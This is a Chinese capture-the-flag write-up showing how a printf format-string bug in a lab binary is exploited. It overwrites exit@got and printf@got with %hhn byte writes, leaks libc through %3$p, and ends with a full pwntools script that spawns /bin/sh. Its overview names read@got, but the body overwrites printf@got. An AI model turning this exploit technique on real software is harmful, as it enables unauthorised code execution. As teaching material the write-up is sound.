# 【2】格式化字符串字节写入

> 又一道利用 printf 格式化字符串漏洞达到任意写的一种可能解法。

[题目链接](https://pan.baidu.com/s/1xfGWKGKwVqgGVzrc95zgjA?pwd=2333) 找 `blog2_blog2` 文件夹

## 题目信息

### checksec

![image-20221125145422452](E:\Pictures\markdown\image-20221125145422452.png)

没有 PIE，有 canary，栈上不可执行

### elf

![image-20221125145548907](E:\Pictures\markdown\image-20221125145548907.png)

使用 **ida64** 查看

![image-20221125145826239](E:\Pictures\markdown\image-20221125145826239.png)

题目逻辑就是：输入什么，就让调用 **printf** 函数来输出什么。而且可输入长度为 256，但是不足以覆盖到栈的 **ret** 地址

## 题解

本题的解题思路如下：

1. 由于程序在正常流程下执行完一次 **printf** 就会直接调用 **exit()** 退出，**main** 函数甚至没有 **ret**，所以需要第一次直接控制程序流，让进程不断循环。这里选择改写 **exit@got** 的内容指向程序 **main** 函数中合适的地方，让程序在每次执行到 **exit()** 时都循环。
2. 程序能够循环进入以后，充分发挥 **printf** 功能，泄露某些程序的地址，进一步得到程序的基址
3. 由于 **read** 函数的输入长度不足以覆盖到 **ret** 地址，考虑用继续通过单字节修改的方式，将 **read@got** 修改成 **system@got**，再在下一次返回时传入 **libc_str_bin_sh** 以此达成 `system("/bin/sh")` 的功能

### 1. 改写 exit@got 的内容

> 格式化字符串修改内存的功能

1. `%n`：赋值，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量
2. `%10c%8$n`：先输出 10 个字符，再将已经打印出的字符数量(10)赋值到指针往后第 8 个所指地址中
3. `%20c%8$hhn`：往后 8 个指针的地址上写入 `\x14（单字节）`

给出的一个快速脚本如下：

```python
def fmtChangeByte(byte, position):
    result = "%{}c%{}$hhn%{}c".format(int(byte, 16), position, 256 - int(byte, 16))
    a = len(result) # 由于长度不定，扩展成 3 行来保证每一次都成功写入
    result = "%{}c%{}$hhn%{}c".format(int(byte, 16) - (24 - a), position, 256 - int(byte, 16)).rjust(24, 'a')
    return result.encode('utf8')

# 例如：将 \xab 写入到 15$hhn 的位置
fmtChangeByte('ab', 15)
```

> 确定要写入的地方

为了能让程序顺利进入循环，选择 **main + 35** 的位置作为目标地址，其值为 **0x4012a5**

<img src="E:\Pictures\markdown\image-20221125170120894.png" alt="image-20221125170120894" style="zoom:50%;" />

图中可以明确的是 **exit@got** 位置可写，其地址上的内容为 **0x401090**，那么可以 `0x404048 的 \x90 -> \xa5`，`0x404049 的 \x10 -> \x12`

通过 **gdb.attach(p, gdbscript="b *main+122")** 在输入时确定 fmt 的偏移位置：`fmtarg <目标地址>`，如图所示，则调用 `fmtChangeByte('90', 13)` 即可

<img src="E:\Pictures\markdown\image-20221125170917348.png" alt="image-20221125170917348" style="zoom:50%;" />

### 2. 泄露 libc_base

这里观察了 **栈** 和 **寄存器**，发现在 **rcx** 寄存器中存有 **read@got + 14** 的地址值，则可以通过泄露 **rcx** 寄存器，然后减去 **read + 14** 即可得到 **libc_base**，`payload = b'aaab%3$p'`

除此之外，还可以通过 `%<对应偏移>$s + p64(func_got)` 的方式，先将某函数的 got 写到栈，再对应地用 `$s` 来泄露那个位置的信息

### 3. 修改 printf@got

从 `libc_system = libc_base + libc_system_offset` 得到 **libc_system** 的地址

由于 **system** 和 **printf** 函数都通过 **rdi** 寄存器来传值，则可以修改 `printf@got -> system@got`，再传入 **libc_str_bin_sh** 即可

## EXP

完整 **exp** 如下：

```python
# -*- coding: utf-8 -*-

'''
[*] '/home/wkyuu/Desktop/temp/blog2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
'''

from pwn import *
import pwn

p64 = pwn.p64
u64 = pwn.u64

context(log_level='debug')
fileName = './blog2'
p = process(fileName)
elf = ELF(fileName)

# bin
bin_func_main = elf.sym['main'] + 35    # ret 2 [call init()]
bin_pop_rdi_ret = 0x401383    # ROPgadget --binary blog2 | grep "pop rdi"
bin_exit_got = elf.got['exit']
bin_printf_got = elf.got['printf']

# libc
libc_read_14 = 0xfa340 + 14
libc_system = 0x4a490
libc_str_bin_sh = 0x1b3115

def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))
        
def fmtChangeByte(byte, position):
    result = "%{}c%{}$hhn%{}c".format(int(byte, 16), position, 256 - int(byte, 16))
    a = len(result) # 由于长度不定，扩展成 3 行来保证每一次都成功写入
    result = "%{}c%{}$hhn%{}c".format(int(byte, 16) - (24 - a), position, 256 - int(byte, 16)).rjust(24, 'a')
    return result.encode('utf8')

# gdbscript = '''
# b *main+122
# c
# '''
# gdb.attach(p, gdbscript=gdbscript)

# rewrite exit@got to main+35
logger('rewrite exit@got to main+35')
# 0x404048 -> a5
# 0x404049 -> 12
payload = fmtChangeByte('a5', 12) + fmtChangeByte('12', 13) + p64(bin_exit_got) + p64(bin_exit_got + 1)
p.sendlineafter('input sth: \n', payload)

# leak_libc
logger('leak_libc')
payload = b'aaab%3$p'
p.sendlineafter(b'input sth: \n', payload)
p.recvuntil(b'b')

leak_read_got_14 = int(p.recv(14), 16)
libc_base = leak_read_got_14 - libc_read_14
libc_system = libc_base + libc_system
libc_str_bin_sh = libc_base + libc_str_bin_sh

logger('libc_base', hex(libc_base), 'success')
logger('leak_read_got_14', hex(leak_read_got_14), 'success')
logger('libc_system', hex(libc_system), 'success')
logger('libc_str_bin_sh', hex(libc_str_bin_sh), 'success')

# rewrite printf@got to libc_system
logger('rewrite printf@got to libc_system')
libc_system = hex(libc_system)
libc_system_0 = libc_system[-2:]
libc_system_1 = libc_system[-4:-2]
libc_system_2 = libc_system[-6:-4]

payload = fmtChangeByte(libc_system_0, 17) + fmtChangeByte(libc_system_1, 18) + fmtChangeByte(libc_system_2, 19) + \
    p64(bin_printf_got) + p64(bin_printf_got + 1) + p64(bin_printf_got + 2)
p.sendlineafter(b'input sth: \n', payload)

# getshell
logger('getshell')
p.sendlineafter(b'input sth: \n', p64(libc_str_bin_sh))
p.interactive()
```

